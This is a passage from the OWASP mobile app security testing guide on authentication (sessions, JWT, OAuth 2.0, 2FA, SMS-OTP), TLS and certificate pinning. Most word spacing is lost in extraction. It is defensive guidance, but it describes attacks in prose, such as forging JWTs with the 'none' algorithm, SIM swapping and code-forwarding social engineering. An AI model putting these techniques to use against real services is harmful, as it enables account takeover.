isAdmin=True Security experts used to recommend using session-based authentication and maintaining session data on the server only. Thispreventsanyformofclient-sidetamperingwiththesessionstate. However,thewholepointofusingstateless authenticationinsteadofsession-basedauthenticationistonothavesessionstateontheserver. Instead,stateisstored inclient-sidetokensandtransmittedwitheveryrequest. Inthiscase,seeingclient-sideparameterssuchasisAdminis perfectlynormal. Topreventtamperingcryptographicsignaturesareaddedtoclient-sidetokens. Ofcourse,thingsmaygowrong,andpop- ularimplementationsofstatelessauthenticationhavebeenvulnerabletoattacks. Forexample,thesignatureverification ofsomeJSONWebToken(JWT)implementationscouldbedeactivatedbysettingthesignaturetypeto“None”. 50\nBest Practices for Passwords Passwordstrengthisakeyconcernwhenpasswordsareusedforauthentication. Thepasswordpolicydefinesrequirements to which end users should adhere. A password policy typically specifies password length, password complexity, and passwordtopologies. A“strong”passwordpolicymakesmanualorautomatedpasswordcrackingdifficultorimpossible. ForfurtherinformationpleaseconsulttheOWASPAuthenticationCheatSheet. General Guidelines on Testing Authentication There’s no one-size-fits-all approach to authentication. When reviewing the authentication architecture of an app, you shouldfirstconsiderwhethertheauthenticationmethod(s)usedareappropriateinthegivencontext. Authenticationcan bebasedononeormoreofthefollowing: • Somethingtheuserknows(password,PIN,pattern,etc.) • Somethingtheuserhas(SIMcard,one-timepasswordgenerator,orhardwaretoken) • Abiometricpropertyoftheuser(fingerprint,retina,voice) The number of authentication procedures implemented by mobile apps depends on the sensitivity of the functions or accessedresources. Refertoindustrybestpracticeswhenreviewingauthenticationfunctions. Username/passwordau- thentication (combined with a reasonable password policy) is generally considered sufficient for apps that have a user loginandaren’tverysensitive. Thisformofauthenticationisusedbymostsocialmediaapps. Forsensitiveapps,addingasecondauthenticationfactorisusuallyappropriate. Thisincludesappsthatprovideaccessto verysensitiveinformation(suchascreditcardnumbers)orallowuserstotransferfunds. Insomeindustries,theseapps mustalsocomplywithcertainstandards. Forexample,financialappshavetoensurecompliancewiththePaymentCard IndustryDataSecurityStandard(PCIDSS),theGrammLeachBlileyAct,andtheSarbanes-OxleyAct(SOX).Compliance considerationsfortheUShealthcaresectorincludetheHealthInsurancePortabilityandAccountabilityAct(HIPAA)and thePatientSafetyRule. Stateful vs. Stateless Authentication You’ll usually find that the mobile app uses HTTP as the transport layer. The HTTP protocol itself is stateless, so there must be a way to associate a user’s subsequent HTTP requests with that user. Otherwise, the user’s log in credentials wouldhavetobesentwitheveryrequest. Also,boththeserverandclientneedtokeeptrackofuserdata(e.g.,theuser’s privilegesorrole). Thiscanbedoneintwodifferentways: • Withstatefulauthentication,auniquesessionidisgeneratedwhentheuserlogsin. Insubsequentrequests,this sessionIDservesasareferencetotheuserdetailsstoredontheserver. ThesessionIDisopaque;itdoesn’tcontain anyuserdata. • With stateless authentication, all user-identifying information is stored in a client-side token. The token can be passed to any server or micro service, eliminating the need to maintain session state on the server. Stateless authenticationisoftenfactoredouttoanauthorizationserver,whichproduces,signs,andoptionallyencryptsthe tokenuponuserlogin. WebapplicationscommonlyusestatefulauthenticationwitharandomsessionIDthatisstoredinaclient-sidecookie. Al- thoughmobileappssometimesusestatefulsessionsinasimilarfashion,statelesstoken-basedapproachesarebecoming popularforavarietyofreasons: • Theyimprovescalabilityandperformancebyeliminatingtheneedtostoresessionstateontheserver. • Tokensenabledeveloperstodecoupleauthenticationfromtheapp. Tokenscanbegeneratedbyanauthentication server,andtheauthenticationschemecanbechangedseamlessly. Asamobilesecuritytester,youshouldbefamiliarwithbothtypesofauthentication. 51\nStateful Authentication Stateful(or“session-based”)authenticationischaracterizedbyauthenticationrecordsonboththeclientandserver. The authenticationflowisasfollows: 1. Theappsendsarequestwiththeuser’scredentialstothebackendserver. 2. Theserververifiesthecredentials. Ifthecredentialsarevalid,theservercreatesanewsessionalongwitharandom sessionID. 3. TheserversendstotheclientaresponsethatincludesthesessionID. 4. TheclientsendsthesessionIDwithallsubsequentrequests. TheservervalidatesthesessionIDandretrievesthe associatedsessionrecord. 5. Aftertheuserlogsout,theserver-sidesessionrecordisdestroyedandtheclientdiscardsthesessionID. Whensessionsareimproperlymanaged,theyarevulnerabletoavarietyofattacksthatmaycompromisethesessionofa legitimateuser,allowingtheattackertoimpersonatetheuser. Thismayresultinlostdata,compromisedconfidentiality, andillegitimateactions. BestPractices: Locateanyserver-sideendpointsthatprovidesensitiveinformationorfunctionsandverifytheconsistentenforcementof authorization. Thebackendservicemustverifytheuser’ssessionIDortokenandmakesurethattheuserhassufficient privilegestoaccesstheresource. IfthesessionIDortokenismissingorinvalid,therequestmustberejected. Makesurethat: • SessionIDsarerandomlygeneratedontheserverside. • TheIDscan’tbeguessedeasily(useproperlengthandentropy). • SessionIDsarealwaysexchangedoversecureconnections(e.g.HTTPS). • Themobileappdoesn’tsavesessionIDsinpermanentstorage. • Theserververifiesthesessionwheneverausertriestoaccessprivilegedapplicationelements(asessionIDmust bevalidandmustcorrespondtotheproperauthorizationlevel). • Thesessionisterminatedontheserversideandsessioninformationdeletedwithinthemobileappafterittimes outortheuserlogsout. Authenticationshouldn’tbeimplementedfromscratchbutbuiltontopofprovenframeworks. Manypopularframeworks provide ready-made authentication and session management functionality. If the app uses framework APIs for authen- tication, check the framework security documentation for best practices. Security guides for common frameworks are availableatthefollowinglinks: • Spring(Java) • Struts(Java) • Laravel(PHP) • RubyonRails • ASP.Net Agreatresourcefortestingserver-sideauthenticationistheOWASPWebTestingGuide,specificallytheTestingAuthenti- cationandTestingSessionManagementchapters. Stateless Authentication Token-basedauthenticationisimplementedbysendingasignedtoken(verifiedbytheserver)witheachHTTPrequest. The mostcommonlyusedtokenformatistheJSONWebToken,definedinRFC7519. AJWTmayencodethecompletesession stateasaJSONobject. Therefore,theserverdoesn’thavetostoreanysessiondataorauthenticationinformation. JWTtokensconsistofthreeBase64Url-encodedpartsseparatedbydots. TheTokenstructureisasfollows: base64UrlEncode(header).base64UrlEncode(payload).base64UrlEncode(signature) ThefollowingexampleshowsaBase64Url-encodedJSONWebToken: 52\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikpva G4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ Theheadertypicallyconsistsoftwoparts: thetokentype,whichisJWT,andthehashingalgorithmbeingusedtocompute thesignature. Intheexampleabove,theheaderdecodesasfollows: {"alg":"HS256","typ":"JWT"} The second part of the token is the payload, which contains so-called claims. Claims are statements about an entity (typically,theuser)andadditionalmetadata. Forexample: {"sub":"1234567890","name":"JohnDoe","admin":true} ThesignatureiscreatedbyapplyingthealgorithmspecifiedintheJWTheadertotheencodedheader,encodedpayload, andasecretvalue. Forexample,whenusingtheHMACSHA256algorithmthesignatureiscreatedinthefollowingway: HMACSHA256(base64UrlEncode(header)+"."+base64UrlEncode(payload),secret) Note that the secret is shared between the authentication server and the backend service - the client does not know it. This proves that the token was obtained from a legitimate authentication service. It also prevents the client from tamperingwiththeclaimscontainedinthetoken. BestPractices: VerifythattheimplementationadherestoJWTbestpractices: • VerifythattheHMACischeckedforallincomingrequestscontainingatoken. • VerifythattheprivatesigningkeyorHMACsecretkeyisneversharedwiththeclient. Itshouldbeavailableforthe issuerandverifieronly. • Verify that no sensitive data, such as personal identifiable information, is embedded in the JWT. For example, by decodingthebase64-encodedJWTandfindoutwhatkindofdataittransmitsandwhetherthatdataisencrypted. If,forsomereason,thearchitecturerequirestransmissionofsuchinformationinthetoken,makesurethatpayload encryptionisbeingapplied. SeethesampleJavaimplementationontheOWASPJWTCheatSheet. • Makesurethatreplayattacksareaddressedwiththejti(JWTID)claim,whichgivestheJWTauniqueidentifier. • Make sure that cross service relay attacks are addressed with the aud (audience) claim, which defines for which applicationthetokenisentitled. • Verifythattokensarestoredsecurelyonthemobilephone,with,forexample,KeyChain(iOS)orKeyStore(Android). • Verifythatthehashingalgorithmisenforced. Acommonattackincludesalteringthetokentouseanemptysignature (e.g.,signature=““)andsetthesigningalgorithmtonone,indicatingthat”theintegrityofthetokenhasalready beenverified”. Somelibrariesmighttreattokenssignedwiththenonealgorithmasiftheywerevalidtokenswith verifiedsignatures,sotheapplicationwilltrustalteredtokenclaims. • Verifythattokensincludean“exp”expirationclaimandthebackenddoesn’tprocessexpiredtokens. Acommon methodofgrantingtokenscombinesaccesstokensandrefreshtokens. Whentheuserlogsin,thebackendservice issuesashort-livedaccesstokenandalong-livedrefreshtoken. Theapplicationcanthenusetherefreshtokento obtainanewaccesstoken,iftheaccesstokenexpires. TherearetwodifferentBurpPluginsthatcanhelpyoufortestingthevulnerabilitieslistedabove: • JSONWebTokenAttacker • JSONWebTokens Also,makesuretocheckouttheOWASPJWTCheatSheetforadditionalinformation. OAuth 2.0 OAuth2.0isanauthorizationframeworkthatenablesthird-partyapplicationstoobtainlimitedaccesstouseraccounts onremoteHTTPservicessuchasAPIsandweb-enabledapplications. CommonusesforOAuth2include: 53\n• Gettingpermissionfromtheusertoaccessanonlineserviceusingtheiraccount. • Authenticatingtoanonlineserviceonbehalfoftheuser. • Handlingauthenticationerrors. AccordingtoOAuth2.0,amobileclientseekingaccesstoauser’sresourcesmustfirstasktheusertoauthenticateagainst anauthenticationserver. Withtheusers’approval,theauthorizationserverthenissuesatokenthatallowstheapptoact onbehalfoftheuser. NotethattheOAuth2specificationdoesn’tdefineanyparticularkindofauthenticationoraccess tokenformat. Protocol Overview OAuth2.0definesfourroles: • ResourceOwner: theaccountowner • Client: theapplicationthatwantstoaccesstheuser’saccountwiththeaccesstokens • ResourceServer: hoststheuseraccounts • AuthorizationServer: verifiesuseridentityandissuesaccesstokenstotheapplication Note: The API fulfills both the Resource Owner and Authorization Server roles. Therefore, we will refer to both as the API. Hereisamoredetailedexplanationofthestepsinthediagram: 1. Theapplicationrequestsuserauthorizationtoaccessserviceresources. 2. If the user authorizes the request, the application receives an authorization grant. The authorization grant may takeseveralforms(explicit,implicit,etc.). 3. The application requests an access token from the authorization server (API) by presenting authentication of its ownidentityalongwiththeauthorizationgrant. 4. Iftheapplicationidentityisauthenticatedandtheauthorizationgrantisvalid,theauthorizationserver(API)issues anaccesstokentotheapplication,completingtheauthorizationprocess. Theaccesstokenmayhaveacompanion refreshtoken. 5. Theapplicationrequeststheresourcefromtheresourceserver(API)andpresentstheaccesstokenforauthentica- tion. Theaccesstokenmaybeusedinseveralways(e.g.,asabearertoken). 6. Iftheaccesstokenisvalid,theresourceserver(API)servestheresourcetotheapplication. InOAuth2,theuseragentistheentitythatperformstheauthentication. OAuth2authenticationcanbeperformedeither throughanexternaluseragent(e.g.ChromeorSafari)orintheappitself(e.g.throughaWebViewembeddedintothe apporanauthenticationlibrary). Noneofthetwomodesisintrinsically“better”thantheother. Thechoicedependson theapp’sspecificusecaseandthreatmodel. External User Agent: Usinganexternaluseragent isthemethodofchoiceforappsthatneedtointeractwithsocial mediaaccounts(Facebook,Twitter,etc.). Advantagesofthismethodinclude: 54\n• The user’s credentials are never directly exposed to the app. This guarantees that the app cannot obtain the credentialsduringtheloginprocess(“credentialphishing”). • Almostnoauthenticationlogicmustbeaddedtotheappitself,preventingcodingerrors. Onthenegativeside,thereisnowaytocontrolthebehaviorofthebrowser(e.g.toactivatecertificatepinning). Embedded User Agent: Usinganembeddeduseragent isthemethodofchoiceforappsthatneedtooperatewithin a closed ecosystem, for example to interact with corporate accounts. For example, consider a banking app that uses OAuth2toretrieveanaccesstokenfromthebank’sauthenticationserver,whichisthenusedtoaccessanumberofmicro services. Inthatcase,credentialphishingisnotaviablescenario. Itislikelypreferabletokeeptheauthenticationprocess inthe(hopefully)carefullysecuredbankingapp,insteadofplacingtrustonexternalcomponents. Best Practices Foradditionalbestpracticesanddetailedinformationpleaserefertothefollowingsourcedocuments: • RFC6749-TheOAuth2.0AuthorizationFramework(October2012) • RFC8252-OAuth2.0forNativeApps(October2017) • RFC6819-OAuth2.0ThreatModelandSecurityConsiderations(January2013) Someofthebestpracticesincludebutarenotlimitedto: • Useragent: – Theusershouldhaveawaytovisuallyverifytrust(e.g.,TransportLayerSecurity(TLS)confirmation,website mechanisms). – Topreventman-in-the-middleattacks,theclientshouldvalidatetheserver’sfullyqualifieddomainnamewith thepublickeytheserverpresentedwhentheconnectionwasestablished. • Typeofgrant: – Onnativeapps,codegrantshouldbeusedinsteadofimplicitgrant. – Whenusingcodegrant,PKCE(ProofKeyforCodeExchange)shouldbeimplementedtoprotectthecodegrant. Makesurethattheserveralsoimplementsit. – Theauth“code”shouldbeshort-livedandusedimmediatelyafteritisreceived. Verifythatauthcodesonly resideontransientmemoryandaren’tstoredorlogged. • Clientsecrets: – Shared secrets should not be used to prove the client’s identity because the client could be impersonated (“client_id”alreadyservesasproof). Iftheydouseclientsecrets,besurethattheyarestoredinsecurelocal storage. • End-Usercredentials: – Securethetransmissionofend-usercredentialswithatransport-layermethod,suchasTLS. • Tokens: – Keepaccesstokensintransientmemory. – Accesstokensmustbetransmittedoveranencryptedconnection. – Reducethescopeanddurationofaccesstokenswhenend-to-endconfidentialitycan’tbeguaranteedorthe tokenprovidesaccesstosensitiveinformationortransactions. – Rememberthatanattackerwhohasstolentokenscanaccesstheirscopeandallresourcesassociatedwith themiftheappusesaccesstokensasbearertokenswithnootherwaytoidentifytheclient. – Storerefreshtokensinsecurelocalstorage;theyarelong-termcredentials. User Logout Failingtodestroytheserver-sidesessionisoneofthemostcommonlogoutfunctionalityimplementationerrors. Thiserror keepsthesessionortokenalive,evenaftertheuserlogsoutoftheapplication. Anattackerwhogetsvalidauthentication informationcancontinuetouseitandhijackauser’saccount. 55\nManymobileappsdon’tautomaticallylogusersout. Therecanbevariousreasons,suchas: becauseitisinconvenient for customers, or because of decisions made when implementing stateless authentication. The application should still havealogoutfunction,anditshouldbeimplementedaccordingtobestpractices,destroyingalllocallystoredtokensor sessionidentifiers. Ifsessioninformationisstoredontheserver,itshouldbedestroyedbysendingalogoutrequesttothatserver. Incaseof ahigh-riskapplication,tokensshouldbeinvalidated. Notremovingtokensorsessionidentifierscanresultinunauthorized accesstotheapplicationincasethetokensareleaked. Notethatothersensitivetypesofinformationshouldberemoved aswell,asanyinformationthatisnotproperlyclearedmaybeleakedlater,forexampleduringadevicebackup. Herearedifferentexamplesofsessionterminationforproperserver-sidelogout: • Spring(Java) • RubyonRails • PHP Ifaccessandrefreshtokensareusedwithstatelessauthentication,theyshouldbedeletedfromthemobiledevice. The refreshtokenshouldbeinvalidatedontheserver. TheOWASPWebTestingGuide(WSTG-SESS-06)includesadetailedexplanationandmoretestcases. Supplementary Authentication Authenticationschemesaresometimessupplementedbypassivecontextualauthentication,whichcanincorporate: • Geolocation • IPaddress • Timeofday • Thedevicebeingused Ideally, in such a system the user’s context is compared to previously recorded data to identify anomalies that might indicateaccountabuseorpotentialfraud. Thisprocessistransparenttotheuser,butcanbecomeapowerfuldeterrent toattackers. Two-factor Authentication Two-factor authentication (2FA) is standard for apps that allow users to access sensitive functions and data. Common implementationsuseapasswordforthefirstfactorandanyofthefollowingasthesecondfactor: • One-timepasswordviaSMS(SMS-OTP) • One-timecodeviaphonecall • Hardwareorsoftwaretoken • PushnotificationsincombinationwithPKIandlocalauthentication Whateveroptionisused,italwaysmustbeenforcedandverifiedontheserver-sideandneveronclient-side. Otherwise the2FAcanbeeasilybypassedwithintheapp. The2FAcanbeperformedatloginorlaterintheuser’ssession. For example, after logging in to a banking app with a username and PIN, the user is authorized to perform non- sensitive tasks. Once the user attempts to execute a bank transfer, the second factor (“step-up authentication”) mustbepresented. BestPractices: • Don’trollyourown2FA:Therearevarioustwo-factorauthenticationmechanismsavailablewhichcanrangefrom third-partylibraries,usageofexternalappstoselfimplementedchecksbythedevelopers. • Useshort-livedOTPs: AOTPshouldbevalidforonlyacertainamountoftime(usually30seconds)andafterkeying intheOTPwronglyseveraltimes(usually3times)theprovidedOTPshouldbeinvalidatedandtheusershouldbe redirectedtothelandingpageorloggedout. • Storetokenssecurely: Topreventthesekindofattacks,theapplicationshouldalwaysverifysomekindofusertoken orotherdynamicinformationrelatedtotheuserthatwaspreviouslysecurelystored(e.g.intheKeychain/KeyStore). 56\nSMS-OTP Althoughone-timepasswords(OTP)sentviaSMSareacommonsecondfactorfortwo-factorauthentication,thismethod has its shortcomings. In 2016, NIST suggested: “Dueto the risk that SMS messages may be intercepted or redirected, implementersofnewsystemsSHOULDcarefullyconsideralternativeauthenticators.”. Belowyouwillfindalistofsome relatedthreatsandsuggestionstoavoidsuccessfulattacksonSMS-OTP. Threats: • WirelessInterception: TheadversarycaninterceptSMSmessagesbyabusingfemtocellsandotherknownvulnera- bilitiesinthetelecommunicationsnetwork. • Trojans: InstalledmaliciousapplicationswithaccesstotextmessagesmayforwardtheOTPtoanothernumberor backend. • SIMSWAPAttack: Inthisattack,theadversarycallsthephonecompany,orworksforthem,andhasthevictim’s numbermovedtoaSIMcardownedbytheadversary. Ifsuccessful,theadversarycanseetheSMSmessageswhich aresenttothevictim’sphonenumber. Thisincludesthemessagesusedinthetwo-factorauthentication. • VerificationCodeForwardingAttack: Thissocialengineeringattackreliesonthetrusttheusershaveinthecompany providingtheOTP.Inthisattack,theuserreceivesacodeandislateraskedtorelaythatcodeusingthesamemeans inwhichitreceivedtheinformation. • Voicemail: Sometwo-factorauthenticationschemesallowtheOTPtobesentthroughaphonecallwhenSMSisno longerpreferredoravailable. Manyofthesecalls,ifnotanswered,sendtheinformationtovoicemail. Ifanattacker wasabletogainaccesstothevoicemail,theycouldalsousetheOTPtogainaccesstoauser’saccount. YoucanfindbelowseveralsuggestionstoreducethelikelihoodofexploitationwhenusingSMSforOTP: • Messaging: WhensendinganOTPviaSMS,besuretoincludeamessagethatletstheuserknow1)whattodoif theydidnotrequestthecode2)yourcompanywillnevercallortextthemrequestingthattheyrelaytheirpassword orcode. • Dedicated Channel: When using the OS push notification feature (APN on iOS and FCM on Android), OTPs can be sent securely to a registered application. This information is, compared to SMS, not accessible by other applications. AlternativelyofaOTPthepushnotificationcouldtriggerapop-uptoapprovetherequestedaccess. • Entropy: Use authenticators with high entropy to make OTPs harder to crack or guess and use at least 6 digits. Makesurethatdigitsareseparatesinsmallergroupsincasepeoplehavetorememberthemtocopythemtoyour app. • AvoidVoicemail: Ifauserpreferstoreceiveaphonecall,donotleavetheOTPinformationasavoicemail. SMS-OTPResearch: • [#dmitrienko]Dmitrienko,Alexandra,etal.“Onthe(in)securityofmobiletwo-factorauthentication.” International ConferenceonFinancialCryptographyandDataSecurity. Springer,Berlin,Heidelberg,2014. • [#grassi] Grassi, Paul A., et al. Digital identity guidelines: Authentication and lifecycle management (DRAFT). No.SpecialPublication(NISTSP)-800-63B.2016. • [#grassi2]Grassi,PaulA.,etal.Digitalidentityguidelines: Authenticationandlifecyclemanagement. No.Special Publication(NISTSP)-800-63B.2017. • [#konoth]Konoth,RadheshKrishnan,VictorvanderVeen,andHerbertBos. “Howanywherecomputingjustkilled yourphone-basedtwo-factorauthentication.” InternationalConferenceonFinancialCryptographyandDataSecu- rity. Springer,Berlin,Heidelberg,2016. • [#mulliner]Mulliner,Collin,etal.“SMS-basedone-timepasswords: attacksanddefense.” InternationalConference onDetectionofIntrusionsandMalware,andVulnerabilityAssessment. Springer,Berlin,Heidelberg,2013. • [#siadati]Siadati,Hossein,etal.“MindyourSMSes: Mitigatingsocialengineeringinsecondfactorauthentication.” Computers&Security65(2017): 14-28. • [#siadati2]Siadati,Hossein,ToanNguyen,andNasirMemon. “Verificationcodeforwardingattack(shortpaper).” InternationalConferenceonPasswords. Springer,Cham,2015. Transaction Signing with Push Notifications and PKI Anotheralternativeandstrongmechanismstoimplementasecondfactoristransactionsigning. Transactionsigningrequiresauthenticationoftheuser’sapprovalofcriticaltransactions. Asymmetriccryptographyisthe bestwaytoimplementtransactionsigning. Theappwillgenerateapublic/privatekeypairwhentheusersignsup,then 57\nregistersthepublickeyonthebackend. TheprivatekeyissecurelystoredintheKeyStore(Android)orKeyChain(iOS). To authorize a transaction, the backend sends the mobile app a push notification containing the transaction data. The useristhenaskedtoconfirmordenythetransaction. Afterconfirmation,theuserispromptedtounlocktheKeychain(by enteringthePINorfingerprint),andthedataissignedwithuser’sprivatekey. Thesignedtransactionisthensenttothe server,whichverifiesthesignaturewiththeuser’spublickey. Login Activity and Device Blocking Itisabestpracticethatappsshouldinformtheuseraboutallloginactivitieswithintheappwiththepossibilityofblocking certaindevices. Thiscanbebrokendownintovariousscenarios: 1. Theapplicationprovidesapushnotificationthemomenttheiraccountisusedonanotherdevicetonotifytheuser ofdifferentactivities. Theusercanthenblockthisdeviceafteropeningtheappviathepush-notification. 2. The application provides an overview of the last session after login. If the previous session was with a different configuration(e.g.location,device,app-version)comparedtothecurrentconfiguration,thentheusershouldhave theoptiontoreportsuspiciousactivitiesandblockdevicesusedintheprevioussession. 3. Theapplicationprovidesanoverviewofthelastsessionafterloginatalltimes. 4. Theapplicationhasaself-serviceportalinwhichtheusercanseeanaudit-log. Thisallowstheusertomanagethe differentdevicesthatareloggedin. Thedevelopercanmakeuseofspecificmeta-informationandassociateittoeachdifferentactivityoreventwithinthe application. This will make it easier for the user to spot suspicious behavior and block the corresponding device. The meta-informationmayinclude: • Device: Theusercanclearlyidentifyalldeviceswheretheappisbeingused. • DateandTime: Theusercanclearlyseethelatestdateandtimewhentheappwasused. • Location: Theusercanclearlyidentifythelatestlocationswheretheappwasused. Theapplicationcanprovidealistofactivitieshistorywhichwillbeupdatedaftereachsensitiveactivitywithintheappli- cation. Thechoiceofwhichactivitiestoauditneedstobedoneforeachapplicationbasedonthedataithandlesandthe levelofsecurityrisktheteamiswillingtohave. Belowisalistofcommonsensitiveactivitiesthatareusuallyaudited: • Loginattempts • Passwordchanges • PersonalIdentifiableInformationchanges(name,emailaddress,telephonenumber,etc.) • Sensitiveactivities(purchase,accessingimportantresources,etc.) • ConsenttoTermsandConditionsclauses Paidcontentrequiresspecialcare, andadditionalmeta-information(e.g., operationcost, credit, etc.) mightbeusedto ensureuser’sknowledgeaboutthewholeoperation’sparameters. In addition, non-repudiation mechanisms should be applied to sensitive transactions (e.g. paid content access, given consenttoTermsandConditionsclauses,etc.) inordertoprovethataspecifictransactionwasinfactperformed(integrity) andbywhom(authentication). Lastly,itshouldbepossiblefortheusertologoutspecificopensessionsandinsomecasesitmightbeinterestingtofully blockcertaindevicesusingadeviceidentifier. 58\nMobile App Network Communication Practicallyeverynetwork-connectedmobileappusestheHypertextTransferProtocol(HTTP)orHTTPoverTransportLayer Security (TLS), HTTPS, to send and receive data to and from remote endpoints. Consequently, network-based attacks (such as packet sniffing and man-in-the-middle-attacks) are a problem. In this chapter we discuss potential vulnera- bilities, testing techniques, and best practices concerning the network communication between mobile apps and their endpoints. Secure Connections The time has long passed since it was reasonable to use cleartext HTTP alone and it’s usually trivial to secure HTTP connectionsusingHTTPS.HTTPSisessentiallyHTTPlayeredontopofanotherprotocolknownasTransportLayerSecurity (TLS).AndTLSperformsahandshakeusingpublickeycryptographyand,whencomplete,createsasecureconnection. AnHTTPSconnectionisconsideredsecurebecauseofthreeproperties: • Confidentiality: TLSencryptsdatabeforesendingitoverthenetwork,whichmeansitcan’tbereadbyaninter- mediary. • Integrity: thedatacan’tbealteredwithoutdetection. • Authentication: theclientcanvalidatetheidentityoftheservertomakesuretheconnectionisestablishedwith thecorrectserver. Server Trust Evaluation CertificateAuthorities(CAs)areanintegralpartofasecureclientservercommunicationandtheyarepredefinedinthe truststoreofeachoperatingsystem. Forinstance,oniOStherearemorethan200rootcertificatesinstalled(seeApple documentation-AvailabletrustedrootcertificatesforAppleoperatingsystems) CAs can be added to the trust store, either manually by the user, by an MDM that manages the enterprise device or through malware. The question is then: “can you trust all of those CAs and should your app rely on the default trust store?”. Afterall,therearewell-knowncaseswherecertificateauthoritieshavebeencompromisedortrickedintoissuing certificatestoimpostors. AdetailedtimelineofCAbreachesandfailurescanbefoundatsslmate.com. BothAndroidandiOSallowtheusertoinstalladditionalCAsortrustanchors. AnappmaywanttotrustacustomsetofCAsinsteadoftheplatformdefault. Themostcommonreasonsforthisare: • Connectingtoahostwithacustomcertificateauthority(aCAthatisn’tknownortrustedbythesystemyet),such asaCAthatisself-signedorisissuedinternallywithinacompany. • LimitingthesetofCAstoaspecificlistoftrustedCAs. • TrustingadditionalCAsnotincludedinthesystem. About Trust Stores Extending Trust Whenevertheappconnectstoaserverwhosecertificateisself-signedorunknowntothesystem,thesecureconnection willfail. ThisistypicallythecaseforanynonpublicCAs,forinstancethoseissuedbyanorganizationsuchasagovernment, corporation,oreducationinstitutionfortheirownuse. BothAndroidandiOSoffermeanstoextendtrust,i.e.includeadditionalCAssothattheapptruststhesystem’sbuilt-in onesplusthecustomones. However,rememberthatthedeviceusersarealwaysabletoincludeadditionalCAs. Therefore,dependingonthethreat modeloftheappitmightbenecessarytoavoidtrustinganycertificatesaddedtotheusertruststoreorevengofurther andonlytrustapre-definedspecificcertificateorsetofcertificates. Formanyapps,the“defaultbehavior”providedbythemobileplatformwillbesecureenoughfortheirusecase(intherare casethatasystem-trustedCAiscompromisedthedatahandledbytheappisnotconsideredsensitiveorothersecurity 59\nmeasuresaretakenwhichareresilienteventosuchaCAbreach). However, forotherappssuchasfinancialorhealth apps,theriskofaCAbreach,evenifrare,mustbeconsidered. Restricting Trust: Identity Pinning SomeappsmightneedtofurtherincreasetheirsecuritybyrestrictingthenumberofCAsthattheytrust. Typicallyonly theCAswhichareusedbythedeveloperareexplicitlytrusted,whiledisregardingallothers. Thistrustrestrictionisknown asIdentityPinningusuallyimplementedasCertificatePinningorPublicKeyPinning. IntheOWASPMASTGwewillbereferringtothistermas“IdentityPinning”,“CertificatePinning”,“PublicKeyPinning” orsimply“Pinning”. Pinningistheprocessofassociatingaremoteendpointwithaparticularidentity,suchasaX.509certificateorpublickey, insteadofacceptinganycertificatesignedbyatrustedCA.Afterpinningtheserveridentity(oracertainset,aka. pinset), themobileappwillsubsequentlyconnecttothoseremoteendpointsonlyiftheidentitymatches. Withdrawingtrustfrom unnecessaryCAsreducestheapp’sattacksurface. General Guidelines TheOWASPCertificatePinningCheatSheetgivesessentialguidanceon: • whenpinningisrecommendedandwhichexceptionsmightapply. • whentopin: developmenttime(preloading)oruponfirstencountering(trustonfirstuse). • whattopin: certificate,publickeyorhash. BothAndroidandiOSrecommendationsmatchthe“bestcase”whichis: • Pinonlytoremoteendpointswherethedeveloperhascontrol. • atdevelopmenttimevia(NSC/ATS) • pinahashoftheSPKIsubjectPublicKeyInfo. Pinninghasgainedabadreputationsinceitsintroductionseveralyearsago. We’dliketoclarifyacoupleofpointsthat arevalidatleastformobileapplicationsecurity: • The bad reputation is due to operational reasons (e.g. implementation/pin management complexity) not lack of security. • Ifanappdoesnotimplementpinning,thisshouldn’tbereportedasavulnerability. However,iftheappmustverify againstMASVS-L2itmustbeimplemented. • BothAndroidandiOSmakeimplementingpinningveryeasyandfollowthebestpractices. • PinningprotectsagainstacompromisedCAoramaliciousCAthatisinstalledonthedevice. Inthosecases,pinning willpreventtheOSfromestablishingasecureconnectionfrombeingestablishedwithamaliciousserver. However, ifanattackerisincontrolofthedevice,theycaneasilydisableanypinninglogicandthusstillallowtheconnection to happen. As a result, this will not prevent an attacker from accessing your backend and abusing server-side vulnerabilities. • Pinning in mobile apps is not the same as HTTP Public Key Pinning (HPKP). The HPKP header is no longer recom- mendedonwebsitesasitcanleadtousersbeinglockedoutofthewebsitewithoutanywaytorevertthelockout. For mobile apps, this is not an issue, as the app can always be updated via an out-of-band channel (i.e. the app store)incasethereareanyissues. About Pinning Recommendations in Android Developers TheAndroidDeveloperssiteincludesthefollowingwarning: Caution: CertificatePinningisnotrecommendedforAndroidapplicationsduetothehighriskoffutureservercon- figurationchanges,suchaschangingtoanotherCertificateAuthority,renderingtheapplicationunabletoconnect totheserverwithoutreceivingaclientsoftwareupdate. Theyalsoincludethisnote: 60\nNotethat,whenusingcertificatepinning,youshouldalwaysincludeabackupkeysothatifyouareforcedtoswitch tonewkeysorchangeCAs(whenpinningtoaCAcertificateoranintermediateofthatCA),yourapp’sconnectivity isunaffected. Otherwise,youmustpushoutanupdatetotheapptorestoreconnectivity. Thefirststatementcanbemistakenlyinterpretedassayingthatthey“donotrecommendcertificatepinning”. Thesecond statement clarifies this: the actual recommendation is that if developers want to implement pinning they have to take thenecessaryprecautions. About Pinning Recommendations in Apple Developers Applerecommendsthinkinglong-termandcreatingaproperserverauthenticationstrategy. OWASP MASTG Recommendation Pinningisarecommendedpractice,especiallyforMASVS-L2apps. However,developersmustimplementitexclusively fortheendpointsundertheircontrolandbesuretoincludebackupkeys(aka. backuppins)andhaveaproperappupdate strategy. Learn more • “AndroidSecurity: SSLPinning” • OWASPCertificatePinningCheatSheet Verifying the TLS Settings Oneofthecoremobileappfunctionsissending/receivingdataoveruntrustednetworksliketheInternet. Ifthedatais notproperlyprotectedintransit, anattackerwithaccesstoanypartofthenetworkinfrastructure(e.g., aWi-Fiaccess point)mayintercept,read,ormodifyit. Thisiswhyplaintextnetworkprotocolsarerarelyadvisable. ThevastmajorityofappsrelyonHTTPforcommunicationwiththebackend. HTTPSwrapsHTTPinanencryptedconnection (theacronymHTTPSoriginallyreferredtoHTTPoverSecureSocketLayer(SSL);SSListhedeprecatedpredecessorofTLS). TLSallowsauthenticationofthebackendserviceandensuresconfidentialityandintegrityofthenetworkdata. Recommended TLS Settings EnsuringproperTLSconfigurationontheserversideisalsoimportant. TheSSLprotocolisdeprecatedandshouldnolonger beused. AlsoTLSv1.0andTLSv1.1haveknownvulnerabilitiesandtheirusageisdeprecatedinallmajorbrowsersby 2020. 